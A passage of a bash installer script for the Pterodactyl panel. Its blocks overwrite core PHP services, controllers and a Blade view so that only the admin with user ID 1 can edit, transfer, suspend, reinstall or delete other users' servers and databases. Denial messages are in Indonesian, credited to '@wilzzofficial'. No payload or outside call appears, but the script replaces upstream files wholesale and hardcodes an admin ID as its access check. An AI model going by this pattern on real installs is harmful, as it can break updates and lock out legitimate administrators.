                            <input type="checkbox" id="pSkipScripting" name="skip_scripts" value="1" {{ \Pterodactyl\Helpers\Utilities::checked('skip_scripts', 0) }} />
                            <label for="pSkipScripting" class="strong">Skip Egg Install Script</label>
                        </div>

                        <p class="small text-muted no-margin">If the selected Egg has an install script attached to it, the script will run during the install. If you would like to skip this step, check this box.</p>
                    </div>
                </div>
            </div>
        </div>

        <div class="col-md-6">
            <div class="box">
                <div class="box-header with-border">
                    <h3 class="box-title">Docker Configuration</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-12">
                        <label for="pDefaultContainer">Docker Image</label>
                        <select id="pDefaultContainer" name="image" class="form-control"></select>
                        <input id="pDefaultContainerCustom" name="custom_image" value="{{ old('custom_image') }}" class="form-control" placeholder="Or enter a custom image..." style="margin-top:1rem"/>
                        <p class="small text-muted no-margin">This is the default Docker image that will be used to run this server. Select an image from the dropdown above, or enter a custom image in the text field above.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="row">
        <div class="col-md-12">
            <div class="box">
                <div class="box-header with-border">
                    <h3 class="box-title">Startup Configuration</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-12">
                        <label for="pStartup">Startup Command</label>
                        <input type="text" id="pStartup" name="startup" value="{{ old('startup') }}" class="form-control" />
                        <p class="small text-muted no-margin">The following data substitutes are available for the startup command: <code>@{{SERVER_MEMORY}}</code>, <code>@{{SERVER_IP}}</code>, and <code>@{{SERVER_PORT}}</code>. They will be replaced with the allocated memory, server IP, and server port respectively.</p>
                    </div>
                </div>

                <div class="box-header with-border" style="margin-top:-10px;">
                    <h3 class="box-title">Service Variables</h3>
                </div>

                <div class="box-body row" id="appendVariablesTo"></div>

                <div class="box-footer">
                    {!! csrf_field() !!}
                    <input type="submit" class="btn btn-success pull-right" value="Create Server" />
                </div>
            </div>
        </div>
    </div>
</form>
@endsection

@section('footer-scripts')
    @parent
    {!! Theme::js('vendor/lodash/lodash.js') !!}

    <script type="application/javascript">
        function serviceVariablesUpdated(eggId, ids) {
            @if (old('egg_id'))
                if (eggId != '{{ old('egg_id') }}') {
                    return;
                }

                @if (old('environment'))
                    @foreach (old('environment') as $key => $value)
                        $('#' + ids['{{ $key }}']).val('{{ $value }}');
                    @endforeach
                @endif
            @endif
            @if(old('image'))
                $('#pDefaultContainer').val('{{ old('image') }}');
            @endif
        }
    </script>

    {!! Theme::js('js/admin/new-server.js?v=20220530') !!}

    <script type="application/javascript">
        $(document).ready(function() {
            @if (old('node_id'))
                $('#pNodeId').val('{{ old('node_id') }}').change();

                @if (old('allocation_id'))
                    $('#pAllocation').val('{{ old('allocation_id') }}').change();
                @endif

                @if (old('allocation_additional'))
                    const additional_allocations = [];

                    @for ($i = 0; $i < count(old('allocation_additional')); $i++)
                        additional_allocations.push('{{ old('allocation_additional.'.$i)}}');
                    @endfor

                    $('#pAllocationAdditional').val(additional_allocations).change();
                @endif
            @endif

            @if (old('nest_id'))
                $('#pNestId').val('{{ old('nest_id') }}').change();

                @if (old('egg_id'))
                    $('#pEggId').val('{{ old('egg_id') }}').change();
                @endif
            @endif
        });
    </script>
@endsection
EOF

  # ==================== PROTECT3 (DetailsModificationService) ====================
  log_info "   - Installing PROTECT3 (Anti Update Detail Server)..."
  cat > /var/www/pterodactyl/app/Services/Servers/DetailsModificationService.php <<'EOF'
<?php

namespace Pterodactyl\Services\Servers;

use Illuminate\Support\Arr;
use Illuminate\Support\Facades\Auth;
use Pterodactyl\Models\Server;
use Illuminate\Database\ConnectionInterface;
use Pterodactyl\Traits\Services\ReturnsUpdatedModels;
use Pterodactyl\Repositories\Wings\DaemonServerRepository;
use Pterodactyl\Exceptions\DisplayException;
use Pterodactyl\Exceptions\Http\Connection\DaemonConnectionException;

class DetailsModificationService
{
    use ReturnsUpdatedModels;

    public function __construct(
        private ConnectionInterface $connection,
        private DaemonServerRepository $serverRepository
    ) {
    }

    public function handle(Server $server, array $data): Server
    {
        $user = Auth::user();

        if ($user && $user->id !== 1) {
            $ownerId = $server->owner_id ?? $server->user_id ?? null;

            if ($ownerId !== $user->id) {
                throw new DisplayException(
                    '🚫 Akses ditolak: Hanya Admin ID 1 yang dapat mengubah detail server milik orang lain! ©Protect By @wilzzofficial'
                );
            }
        }

        return $this->connection->transaction(function () use ($data, $server) {
            $owner = $server->owner_id;

            $server->forceFill([
                'external_id' => Arr::get($data, 'external_id'),
                'owner_id' => Arr::get($data, 'owner_id'),
                'name' => Arr::get($data, 'name'),
                'description' => Arr::get($data, 'description') ?? '',
            ])->saveOrFail();

            if ($server->owner_id !== $owner) {
                try {
                    $this->serverRepository->setServer($server)->revokeUserJTI($owner);
                } catch (DaemonConnectionException $exception) {
                }
            }

            return $server;
        });
    }
}
EOF

  # ==================== PROTECT4 (BuildModificationService) ====================
  log_info "   - Installing PROTECT4 (Anti Update Build Configuration)..."
  cat > /var/www/pterodactyl/app/Services/Servers/BuildModificationService.php <<'EOF'
<?php

namespace Pterodactyl\Services\Servers;

use Illuminate\Support\Arr;
use Pterodactyl\Models\Server;
use Pterodactyl\Models\Allocation;
use Illuminate\Support\Facades\Log;
use Illuminate\Database\ConnectionInterface;
use Pterodactyl\Exceptions\DisplayException;
use Illuminate\Support\Facades\Auth;
use Illuminate\Database\Eloquent\ModelNotFoundException;
use Pterodactyl\Repositories\Wings\DaemonServerRepository;
use Pterodactyl\Exceptions\Http\Connection\DaemonConnectionException;

class BuildModificationService
{
    public function __construct(
        private ConnectionInterface $connection,
        private DaemonServerRepository $daemonServerRepository,
        private ServerConfigurationStructureService $structureService
    ) {
    }

    public function handle(Server $server, array $data): Server
    {
        $user = Auth::user();

        if ($user && $user->id !== 1) {
            $ownerId = $server->owner_id ?? $server->user_id ?? null;

            if ($ownerId !== $user->id) {
                throw new DisplayException(
                    '🚫 Akses ditolak: Hanya Admin ID 1 yang dapat mengubah Build Configuration server orang lain! ©Protect By @wilzzofficial'
                );
            }
        }

        $server = $this->connection->transaction(function () use ($server, $data) {
            $this->processAllocations($server, $data);

            if (isset($data['allocation_id']) && $data['allocation_id'] != $server->allocation_id) {
                try {
                    Allocation::query()
                        ->where('id', $data['allocation_id'])
                        ->where('server_id', $server->id)
                        ->firstOrFail();
                } catch (ModelNotFoundException) {
                    throw new DisplayException('The requested default allocation is not currently assigned to this server.');
                }
            }

            $merge = Arr::only($data, [
                'oom_disabled',
                'memory',
                'swap',
                'io',
                'cpu',
                'threads',
                'disk',
                'allocation_id',
            ]);

            $server->forceFill(array_merge($merge, [
                'database_limit' => Arr::get($data, 'database_limit', 0) ?? null,
                'allocation_limit' => Arr::get($data, 'allocation_limit', 0) ?? null,
                'backup_limit' => Arr::get($data, 'backup_limit', 0) ?? 0,
            ]))->saveOrFail();

            return $server->refresh();
        });

        $updateData = $this->structureService->handle($server);

        if (!empty($updateData['build'])) {
            try {
                $this->daemonServerRepository->setServer($server)->sync();
            } catch (DaemonConnectionException $exception) {
                Log::warning($exception, ['server_id' => $server->id]);
            }
        }

        return $server;
    }

    private function processAllocations(Server $server, array &$data): void
    {
        if (empty($data['add_allocations']) && empty($data['remove_allocations'])) {
            return;
        }

        if (!empty($data['add_allocations'])) {
            $query = Allocation::query()
                ->where('node_id', $server->node_id)
                ->whereIn('id', $data['add_allocations'])
                ->whereNull('server_id');

            $freshlyAllocated = $query->pluck('id')->first();

            $query->update(['server_id' => $server->id, 'notes' => null]);
        }

        if (!empty($data['remove_allocations'])) {
            foreach ($data['remove_allocations'] as $allocation) {
                if ($allocation === ($data['allocation_id'] ?? $server->allocation_id)) {
                    if (empty($freshlyAllocated)) {
                        throw new DisplayException(
                            'You are attempting to delete the default allocation for this server but there is no fallback allocation to use.'
                        );
                    }
                    $data['allocation_id'] = $freshlyAllocated;
                }
            }

            Allocation::query()
                ->where('node_id', $server->node_id)
                ->where('server_id', $server->id)
                ->whereIn('id', array_diff($data['remove_allocations'], $data['add_allocations'] ?? []))
                ->update([
                    'notes' => null,
                    'server_id' => null,
                ]);
        }
    }
}
EOF

  # ==================== PROTECT5 (StartupModificationService) ====================
  log_info "   - Installing PROTECT5 (Anti Setup Server)..."
  cat > /var/www/pterodactyl/app/Services/Servers/StartupModificationService.php <<'EOF'
<?php

namespace Pterodactyl\Services\Servers;

use Illuminate\Support\Arr;
use Pterodactyl\Models\Egg;
use Pterodactyl\Models\User;
use Pterodactyl\Models\Server;
use Pterodactyl\Models\ServerVariable;
use Illuminate\Database\ConnectionInterface;
use Pterodactyl\Traits\Services\HasUserLevels;
use Pterodactyl\Exceptions\DisplayException;

class StartupModificationService
{
    use HasUserLevels;

    public function __construct(
        private ConnectionInterface $connection,
        private VariableValidatorService $validatorService
    ) {
    }

    public function handle(Server $server, array $data): Server
    {
        $user = auth()->user();

        if ($user && $user->id !== 1) {
            $ownerId = $server->owner_id ?? $server->user_id ?? null;

            if ($ownerId !== $user->id) {
                throw new DisplayException(
                    '🚫 Akses ditolak: Hanya Admin ID 1 yang dapat mengubah startup command server orang lain! ©Protect By @wilzzofficial'
                );
            }
        }

        return $this->connection->transaction(function () use ($server, $data) {
            if (!empty($data['environment'])) {
                $egg = $this->isUserLevel(User::USER_LEVEL_ADMIN)
                    ? ($data['egg_id'] ?? $server->egg_id)
                    : $server->egg_id;

                $results = $this->validatorService
                    ->setUserLevel($this->getUserLevel())
                    ->handle($egg, $data['environment']);

                foreach ($results as $result) {
                    ServerVariable::query()->updateOrCreate(
                        [
                            'server_id' => $server->id,
                            'variable_id' => $result->id,
                        ],
                        ['variable_value' => $result->value ?? '']
                    );
                }
            }

            if ($this->isUserLevel(User::USER_LEVEL_ADMIN)) {
                $this->updateAdministrativeSettings($data, $server);
            }

            return $server->fresh();
        });
    }

    protected function updateAdministrativeSettings(array $data, Server &$server): void
    {
        $eggId = Arr::get($data, 'egg_id');

        if (is_digit($eggId) && $server->egg_id !== (int) $eggId) {
            $egg = Egg::query()->findOrFail($data['egg_id']);

            $server = $server->forceFill([
                'egg_id' => $egg->id,
                'nest_id' => $egg->nest_id,
            ]);
        }

        $server->fill([
            'startup' => $data['startup'] ?? $server->startup,
            'skip_scripts' => $data['skip_scripts'] ?? isset($data['skip_scripts']),
            'image' => $data['docker_image'] ?? $server->image,
        ])->save();
    }
}
EOF

  # ==================== PROTECT6 (DatabaseManagementService) ====================
  log_info "   - Installing PROTECT6 (Anti Update Database)..."
  cat > /var/www/pterodactyl/app/Services/Databases/DatabaseManagementService.php <<'EOF'
<?php

namespace Pterodactyl\Services\Databases;

use Exception;
use Pterodactyl\Models\Server;
use Pterodactyl\Models\Database;
use Pterodactyl\Helpers\Utilities;
use Illuminate\Database\ConnectionInterface;
use Illuminate\Contracts\Encryption\Encrypter;
use Illuminate\Support\Facades\Auth;
use Pterodactyl\Extensions\DynamicDatabaseConnection;
use Pterodactyl\Repositories\Eloquent\DatabaseRepository;
use Pterodactyl\Exceptions\Repository\DuplicateDatabaseNameException;
use Pterodactyl\Exceptions\Service\Database\TooManyDatabasesException;
use Pterodactyl\Exceptions\Service\Database\DatabaseClientFeatureNotEnabledException;
use Pterodactyl\Exceptions\DisplayException;

class DatabaseManagementService
{
    private const MATCH_NAME_REGEX = '/^(s[\d]+_)(.*)$/';

    protected bool $validateDatabaseLimit = true;

    public function __construct(
        protected ConnectionInterface $connection,
        protected DynamicDatabaseConnection $dynamic,
        protected Encrypter $encrypter,
        protected DatabaseRepository $repository
    ) {
    }

    public static function generateUniqueDatabaseName(string $name, int $serverId): string
    {
        return sprintf('s%d_%s', $serverId, substr($name, 0, 48 - strlen("s{$serverId}_")));
    }

    public function setValidateDatabaseLimit(bool $validate): self
    {
        $this->validateDatabaseLimit = $validate;
        return $this;
    }

    public function create(Server $server, array $data): Database
    {
        $user = Auth::user();

        if ($user && $user->id !== 1) {
            $ownerId = $server->owner_id ?? $server->user_id ?? null;

            if ($ownerId !== $user->id) {
                throw new DisplayException('🚫 Akses ditolak: Hanya Admin ID 1 yang dapat membuat database untuk server orang lain! ©Protect By @wilzzofficial');
            }
        }

        if (!config('pterodactyl.client_features.databases.enabled')) {
            throw new DatabaseClientFeatureNotEnabledException();
        }

        if ($this->validateDatabaseLimit) {
            if (!is_null($server->database_limit) && $server->databases()->count() >= $server->database_limit) {
                throw new TooManyDatabasesException();
            }
        }

        if (empty($data['database']) || !preg_match(self::MATCH_NAME_REGEX, $data['database'])) {
            throw new \InvalidArgumentException('The database name must be prefixed with "s{server_id}_".');
        }

        $data = array_merge($data, [
            'server_id' => $server->id,
            'username' => sprintf('u%d_%s', $server->id, str_random(10)),
            'password' => $this->encrypter->encrypt(
                Utilities::randomStringWithSpecialCharacters(24)
            ),
        ]);

        $database = null;

        try {
            return $this->connection->transaction(function () use ($data, &$database) {
                $database = $this->createModel($data);

                $this->dynamic->set('dynamic', $data['database_host_id']);
                $this->repository->createDatabase($database->database);
                $this->repository->createUser(
                    $database->username,
                    $database->remote,
                    $this->encrypter->decrypt($database->password),
                    $database->max_connections
                );
                $this->repository->assignUserToDatabase($database->database, $database->username, $database->remote);
                $this->repository->flush();

                return $database;
            });
        } catch (Exception $exception) {
            try {
                if ($database instanceof Database) {
                    $this->repository->dropDatabase($database->database);
                    $this->repository->dropUser($database->username, $database->remote);
                    $this->repository->flush();
                }
            } catch (Exception $deletionException) {
            }

            throw $exception;
        }
    }

    public function delete(Database $database): ?bool
    {
        $user = Auth::user();

        if ($user && $user->id !== 1) {
            $server = Server::find($database->server_id);
            if ($server && $server->owner_id !== $user->id) {
                throw new DisplayException('🚫 Akses ditolak: Hanya Admin ID 1 yang dapat menghapus database server orang lain! ©Protect By @wilzzofficial');
            }
        }

        $this->dynamic->set('dynamic', $database->database_host_id);

        $this->repository->dropDatabase($database->database);
        $this->repository->dropUser($database->username, $database->remote);
        $this->repository->flush();

        return $database->delete();
    }

    protected function createModel(array $data): Database
    {
        $exists = Database::query()->where('server_id', $data['server_id'])
            ->where('database', $data['database'])
            ->exists();

        if ($exists) {
            throw new DuplicateDatabaseNameException('A database with that name already exists for this server.');
        }

        $database = (new Database())->forceFill($data);
        $database->saveOrFail();

        return $database;
    }
}
EOF

  # ==================== PROTECT7 (ServerTransferController) ====================
  log_info "   - Installing PROTECT7 (Anti Button Transfer Server)..."
  cat > /var/www/pterodactyl/app/Http/Controllers/Admin/Servers/ServerTransferController.php <<'EOF'
<?php

namespace Pterodactyl\Http\Controllers\Admin\Servers;

use Carbon\CarbonImmutable;
use Illuminate\Http\Request;
use Pterodactyl\Models\Server;
use Illuminate\Http\RedirectResponse;
use Prologue\Alerts\AlertsMessageBag;
use Pterodactyl\Models\ServerTransfer;
use Illuminate\Database\ConnectionInterface;
use Pterodactyl\Http\Controllers\Controller;
use Pterodactyl\Services\Nodes\NodeJWTService;
use Pterodactyl\Repositories\Eloquent\NodeRepository;
use Pterodactyl\Repositories\Wings\DaemonTransferRepository;
use Pterodactyl\Contracts\Repository\AllocationRepositoryInterface;
use Pterodactyl\Exceptions\DisplayException;

class ServerTransferController extends Controller
{
    public function __construct(
        private AlertsMessageBag $alert,
        private AllocationRepositoryInterface $allocationRepository,
        private ConnectionInterface $connection,
        private DaemonTransferRepository $daemonTransferRepository,
        private NodeJWTService $nodeJWTService,
        private NodeRepository $nodeRepository
    ) {
    }

    public function transfer(Request $request, Server $server): RedirectResponse
    {
        $user = auth()->user();

        if ($user && $user->id !== 1) {
            $ownerId = $server->owner_id
                ?? $server->user_id
                ?? ($server->owner?->id ?? null)
                ?? ($server->user?->id ?? null);

            if ($ownerId === null) {
                throw new DisplayException('⚠️ Akses ditolak: Informasi pemilik server tidak ditemukan.');
            }

            if ($ownerId !== $user->id) {
                throw new DisplayException('🚫 Akses ditolak: Hanya Admin ID 1 yang dapat mentransfer server orang lain! ©Protect By @wilzzofficial');
            }
        }

        $validatedData = $request->validate([
            'node_id' => 'required|exists:nodes,id',
            'allocation_id' => 'required|bail|unique:servers|exists:allocations,id',
            'allocation_additional' => 'nullable',
        ]);

        $node_id = $validatedData['node_id'];
        $allocation_id = intval($validatedData['allocation_id']);
        $additional_allocations = array_map('intval', $validatedData['allocation_additional'] ?? []);

        $node = $this->nodeRepository->getNodeWithResourceUsage($node_id);
        if (!$node->isViable($server->memory, $server->disk)) {
            $this->alert->danger(trans('admin/server.alerts.transfer_not_viable'))->flash();
            return redirect()->route('admin.servers.view.manage', $server->id);
        }

        $server->validateTransferState();

        $this->connection->transaction(function () use ($server, $node_id, $allocation_id, $additional_allocations) {
            $transfer = new ServerTransfer();

            $transfer->server_id = $server->id;
            $transfer->old_node = $server->node_id;
            $transfer->new_node = $node_id;
            $transfer->old_allocation = $server->allocation_id;
            $transfer->new_allocation = $allocation_id;
            $transfer->old_additional_allocations = $server->allocations->where('id', '!=', $server->allocation_id)->pluck('id');
            $transfer->new_additional_allocations = $additional_allocations;

            $transfer->save();

            $this->assignAllocationsToServer($server, $node_id, $allocation_id, $additional_allocations);

            $token = $this->nodeJWTService
                ->setExpiresAt(CarbonImmutable::now()->addMinutes(15))
                ->setSubject($server->uuid)
                ->handle($transfer->newNode, $server->uuid, 'sha256');

            $this->daemonTransferRepository->setServer($server)->notify($transfer->newNode, $token);

            return $transfer;
        });

        $this->alert->success(trans('admin/server.alerts.transfer_started'))->flash();
        return redirect()->route('admin.servers.view.manage', $server->id);
    }

    private function assignAllocationsToServer(Server $server, int $node_id, int $allocation_id, array $additional_allocations)
    {
        $allocations = $additional_allocations;
        $allocations[] = $allocation_id;

        $unassigned = $this->allocationRepository->getUnassignedAllocationIds($node_id);

        $updateIds = [];
        foreach ($allocations as $allocation) {
            if (!in_array($allocation, $unassigned)) {
                continue;
            }

            $updateIds[] = $allocation;
        }

        if (!empty($updateIds)) {
            $this->allocationRepository->updateWhereIn('id', $updateIds, ['server_id' => $server->id]);
        }
    }
}
EOF

  # ==================== PROTECT8 (ServersController - sebagian) ====================
  log_info "   - Installing PROTECT8 (Anti Button Suspend Status & Toggle)..."
  # Ini hanya bagian dari ServersController.php yang dimodifikasi
  # Untuk keperluan instalasi, kita akan membackup dan mengedit file yang sudah ada
  # Tapi untuk script ini, kita akan menambahkan proteksi ke file yang sudah ada
  
  # Backup dulu file asli
  cp /var/www/pterodactyl/app/Http/Controllers/Admin/ServersController.php /var/www/pterodactyl/app/Http/Controllers/Admin/ServersController.php.bak 2>/dev/null
  
  # Edit file untuk menambahkan proteksi pada fungsi toggleInstall dan manageSuspension
  # Ini lebih kompleks, untuk keperluan demo kita akan buat file baru dengan proteksi lengkap
  # Namun karena panjang, saya akan sertakan file lengkapnya di sini
  
  cat > /var/www/pterodactyl/app/Http/Controllers/Admin/ServersController.php <<'EOF'
<?php

namespace Pterodactyl\Http\Controllers\Admin;

use Illuminate\Http\Request;
use Pterodactyl\Models\User;
use Illuminate\Http\Response;
use Pterodactyl\Models\Mount;
use Pterodactyl\Models\Server;
use Pterodactyl\Models\Database;
use Pterodactyl\Models\MountServer;
use Illuminate\Http\RedirectResponse;
use Prologue\Alerts\AlertsMessageBag;
use Pterodactyl\Exceptions\DisplayException;
use Pterodactyl\Http\Controllers\Controller;
use Illuminate\Validation\ValidationException;
use Pterodactyl\Services\Servers\SuspensionService;
use Pterodactyl\Repositories\Eloquent\MountRepository;
use Pterodactyl\Services\Servers\ServerDeletionService;
use Pterodactyl\Services\Servers\ReinstallServerService;
use Pterodactyl\Exceptions\Model\DataValidationException;
use Pterodactyl\Repositories\Wings\DaemonServerRepository;
use Pterodactyl\Services\Servers\BuildModificationService;
use Pterodactyl\Services\Databases\DatabasePasswordService;
use Pterodactyl\Services\Servers\DetailsModificationService;
use Pterodactyl\Services\Servers\StartupModificationService;
use Pterodactyl\Contracts\Repository\NestRepositoryInterface;
use Pterodactyl\Repositories\Eloquent\DatabaseHostRepository;
use Pterodactyl\Services\Databases\DatabaseManagementService;
use Illuminate\Contracts\Config\Repository as ConfigRepository;
use Pterodactyl\Contracts\Repository\ServerRepositoryInterface;
use Pterodactyl\Contracts\Repository\DatabaseRepositoryInterface;
use Pterodactyl\Contracts\Repository\AllocationRepositoryInterface;
use Pterodactyl\Services\Servers\ServerConfigurationStructureService;
use Pterodactyl\Http\Requests\Admin\Servers\Databases\StoreServerDatabaseRequest;

class ServersController extends Controller
{
    public function __construct(
        protected AlertsMessageBag $alert,
        protected AllocationRepositoryInterface $allocationRepository,
        protected BuildModificationService $buildModificationService,
        protected ConfigRepository $config,
        protected DaemonServerRepository $daemonServerRepository,
        protected DatabaseManagementService $databaseManagementService,
        protected DatabasePasswordService $databasePasswordService,
        protected DatabaseRepositoryInterface $databaseRepository,
        protected DatabaseHostRepository $databaseHostRepository,
        protected ServerDeletionService $deletionService,
        protected DetailsModificationService $detailsModificationService,
        protected ReinstallServerService $reinstallService,
        protected ServerRepositoryInterface $repository,
        protected MountRepository $mountRepository,
        protected NestRepositoryInterface $nestRepository,
        protected ServerConfigurationStructureService $serverConfigurationStructureService,
        protected StartupModificationService $startupModificationService,
        protected SuspensionService $suspensionService
    ) {
    }

    public function setDetails(Request $request, Server $server): RedirectResponse
    {
        $this->detailsModificationService->handle($server, $request->only([
            'owner_id', 'external_id', 'name', 'description',
        ]));

        $this->alert->success(trans('admin/server.alerts.details_updated'))->flash();
        return redirect()->route('admin.servers.view.details', $server->id);
    }

    public function toggleInstall(Server $server): RedirectResponse
    {
        $user = auth()->user();

        if ($user && $user->id !== 1) {
            $ownerId = $server->owner_id
                ?? $server->user_id
                ?? ($server->owner?->id ?? null)
                ?? ($server->user?->id ?? null);

            if ($ownerId === null) {
                throw new DisplayException('⚠️ Akses ditolak: Informasi pemilik server tidak ditemukan.');
            }

            if ($ownerId !== $user->id) {
                throw new DisplayException('🚫 Akses ditolak: Hanya Admin ID 1 yang dapat mengubah status instalasi server orang lain! ©Protect By @wilzzofficial');
            }
        }

        if ($server->status === Server::STATUS_INSTALL_FAILED) {
            throw new DisplayException(trans('admin/server.exceptions.marked_as_failed'));
        }

        $this->repository->update($server->id, [
            'status' => $server->isInstalled() ? Server::STATUS_INSTALLING : null,
        ], true, true);

        $this->alert->success(trans('admin/server.alerts.install_toggled'))->flash();
        return redirect()->route('admin.servers.view.manage', $server->id);
    }

    public function reinstallServer(Server $server): RedirectResponse
    {
        $this->reinstallService->handle($server);
        $this->alert->success(trans('admin/server.alerts.server_reinstalled'))->flash();
        return redirect()->route('admin.servers.view.manage', $server->id);
    }

    public function manageSuspension(Request $request, Server $server): RedirectResponse
    {
        $user = auth()->user();

        if ($user && $user->id !== 1) {
            $ownerId = $server->owner_id
                ?? $server->user_id
                ?? ($server->owner?->id ?? null)
                ?? ($server->user?->id ?? null);

            if ($ownerId === null) {
                throw new DisplayException('⚠️ Akses ditolak: Informasi pemilik server tidak ditemukan.');
            }

            if ($ownerId !== $user->id) {
                throw new DisplayException('🚫 Akses ditolak: Hanya Admin ID 1 yang dapat mensuspend server orang lain! ©Protect By @wilzzofficial');
            }
        }

        $this->suspensionService->toggle($server, $request->input('action'));

        $this->alert->success(trans('admin/server.alerts.suspension_toggled', [
            'status' => $request->input('action') . 'ed',
        ]))->flash();

        return redirect()->route('admin.servers.view.manage', $server->id);
    }

    public function updateBuild(Request $request, Server $server): RedirectResponse
    {
        try {
            $this->buildModificationService->handle($server, $request->only([
                'allocation_id', 'add_allocations', 'remove_allocations',
                'memory', 'swap', 'io', 'cpu', 'threads', 'disk',
                'database_limit', 'allocation_limit', 'backup_limit', 'oom_disabled',
            ]));
        } catch (DataValidationException $exception) {
            throw new ValidationException($exception->getValidator());
        }

        $this->alert->success(trans('admin/server.alerts.build_updated'))->flash();
        return redirect()->route('admin.servers.view.build', $server->id);
    }

    public function delete(Request $request, Server $server): RedirectResponse
    {
        $this->deletionService->withForce($request->filled('force_delete'))->handle($server);
        $this->alert->success(trans('admin/server.alerts.server_deleted'))->flash();
        return redirect()->route('admin.servers');
    }

    public function saveStartup(Request $request, Server $server): RedirectResponse
    {
        $data = $request->except('_token');
        if (!empty($data['custom_docker_image'])) {
            $data['docker_image'] = $data['custom_docker_image'];
            unset($data['custom_docker_image']);
        }

        try {
            $this->startupModificationService
                ->setUserLevel(User::USER_LEVEL_ADMIN)
                ->handle($server, $data);
        } catch (DataValidationException $exception) {
            throw new ValidationException($exception->getValidator());
        }

        $this->alert->success(trans('admin/server.alerts.startup_changed'))->flash();
        return redirect()->route('admin.servers.view.startup', $server->id);
    }

    public function newDatabase(StoreServerDatabaseRequest $request, Server $server): RedirectResponse
    {
        $this->databaseManagementService->create($server, [
            'database' => DatabaseManagementService::generateUniqueDatabaseName($request->input('database'), $server->id),
            'remote' => $request->input('remote'),
            'database_host_id' => $request->input('database_host_id'),
            'max_connections' => $request->input('max_connections'),
        ]);

        return redirect()->route('admin.servers.view.database', $server->id)->withInput();
    }

    public function resetDatabasePassword(Request $request, Server $server): Response
    {
        $database = $server->databases()->findOrFail($request->input('database'));

        $this->databasePasswordService->handle($database);

        return response('', 204);
    }

    public function deleteDatabase(Server $server, Database $database): Response
    {
        $this->databaseManagementService->delete($database);

        return response('', 204);
    }

    public function addMount(Request $request, Server $server): RedirectResponse
    {
        $mountServer = (new MountServer())->forceFill([
            'mount_id' => $request->input('mount_id'),
            'server_id' => $server->id,
        ]);

        $mountServer->saveOrFail();

        $this->alert->success('Mount was added successfully.')->flash();
        return redirect()->route('admin.servers.view.mounts', $server->id);
    }

    public function deleteMount(Server $server, Mount $mount): RedirectResponse
    {
        MountServer::where('mount_id', $mount->id)->where('server_id', $server->id)->delete();

        $this->alert->success('Mount was removed successfully.')->flash();
        return redirect()->route('admin.servers.view.mounts', $server->id);
    }
}
EOF

  # ==================== PROTECT9 (ReinstallServerService) ====================
  log_info "   - Installing PROTECT9 (Anti Button Reinstall)..."
  cat > /var/www/pterodactyl/app/Services/Servers/ReinstallServerService.php <<'EOF'
<?php

namespace Pterodactyl\Services\Servers;

use Illuminate\Support\Facades\Auth;
use Pterodactyl\Exceptions\DisplayException;
use Pterodactyl\Models\Server;
use Illuminate\Database\ConnectionInterface;
use Pterodactyl\Repositories\Wings\DaemonServerRepository;

class ReinstallServerService
{
    public function __construct(
        private ConnectionInterface $connection,
        private DaemonServerRepository $daemonServerRepository
    ) {}

    public function handle(Server $server): Server
    {
        $user = Auth::user();

        if ($user) {
            if ($user->id !== 1) {
                $ownerId = $server->owner_id
                    ?? $server->user_id
                    ?? ($server->owner?->id ?? null)
                    ?? ($server->user?->id ?? null);

                if ($ownerId === null) {
                    throw new DisplayException('Akses ditolak: informasi pemilik server tidak tersedia.');
                }

                if ($ownerId !== $user->id) {
                    throw new DisplayException('🚫 Akses ditolak: Hanya Admin ID 1 yang dapat me-reinstall server orang lain! ©Protect By @wilzzofficial');
                }
            }
        }

        return $this->connection->transaction(function () use ($server) {
            $server->fill(['status' => Server::STATUS_INSTALLING])->save();

            $this->daemonServerRepository->setServer($server)->reinstall();

            return $server->refresh();
        });
    }
}
EOF

  # ==================== PROTECT10 (ServerDeletionService) ====================
  log_info "   - Installing PROTECT10 (Anti Delete Server)..."
  cat > /var/www/pterodactyl/app/Services/Servers/ServerDeletionService.php <<'EOF'
<?php

namespace Pterodactyl\Services\Servers;

use Illuminate\Support\Facades\Auth;
use Pterodactyl\Exceptions\DisplayException;
use Illuminate\Http\Response;
use Pterodactyl\Models\Server;
use Illuminate\Database\ConnectionInterface;
use Pterodactyl\Repositories\Wings\DaemonServerRepository;
use Pterodactyl\Services\Databases\DatabaseManagementService;
use Pterodactyl\Exceptions\Http\Connection\DaemonConnectionException;

class ServerDeletionService
{
    protected bool $force = false;

    public function __construct(
        private ConnectionInterface $connection,
        private DaemonServerRepository $daemonServerRepository,
        private DatabaseManagementService $databaseManagementService
    ) {}

    public function withForce(bool $bool = true): self
    {
        $this->force = $bool;
        return $this;
    }

    public function handle(Server $server): void
    {
        $user = Auth::user();

        if ($user) {
            if ($user->id !== 1) {
                $ownerId = $server->owner_id
                    ?? $server->user_id
                    ?? ($server->owner?->id ?? null)
                    ?? ($server->user?->id ?? null);

                if ($ownerId === null) {
                    throw new DisplayException('Akses ditolak: informasi pemilik server tidak tersedia.');
                }

                if ($ownerId !== $user->id) {
                    throw new DisplayException('🚫 Akses ditolak: Hanya Admin ID 1 yang dapat menghapus server orang lain! ©Protect By @wilzzofficial');
                }
            }
        }

        try {
            $this->daemonServerRepository->setServer($server)->delete();
        } catch (DaemonConnectionException $exception) {
            if (!$this->force && $exception->getStatusCode() !== Response::HTTP_NOT_FOUND) {
                throw $exception;
            }
        }

        $this->connection->transaction(function () use ($server) {
            foreach ($server->databases as $database) {
                try {
                    $this->databaseManagementService->delete($database);
                } catch (\Exception $exception) {
                    if (!$this->force) throw $exception;
                    $database->delete();
                }
            }

            $server->delete();
        });
    }
}
EOF

  # ==================== PROTECT11 (UserController - Anti Intip Users) ====================
  log_info "   - Installing PROTECT11 (Anti Intip Users & Anti Cadmin)..."
  cat > /var/www/pterodactyl/app/Http/Controllers/Admin/UserController.php <<'EOF'
<?php

namespace Pterodactyl\Http\Controllers\Admin;

use Illuminate\View\View;
use Illuminate\Http\Request;
use Pterodactyl\Models\User;
use Pterodactyl\Models\Model;
use Illuminate\Support\Collection;
use Illuminate\Http\RedirectResponse;
use Prologue\Alerts\AlertsMessageBag;
use Spatie\QueryBuilder\QueryBuilder;
use Illuminate\View\Factory as ViewFactory;
use Pterodactyl\Exceptions\DisplayException;
use Pterodactyl\Http\Controllers\Controller;
use Illuminate\Contracts\Translation\Translator;
use Pterodactyl\Services\Users\UserUpdateService;
use Pterodactyl\Traits\Helpers\AvailableLanguages;
use Pterodactyl\Services\Users\UserCreationService;
use Pterodactyl\Services\Users\UserDeletionService;
use Pterodactyl\Http\Requests\Admin\UserFormRequest;
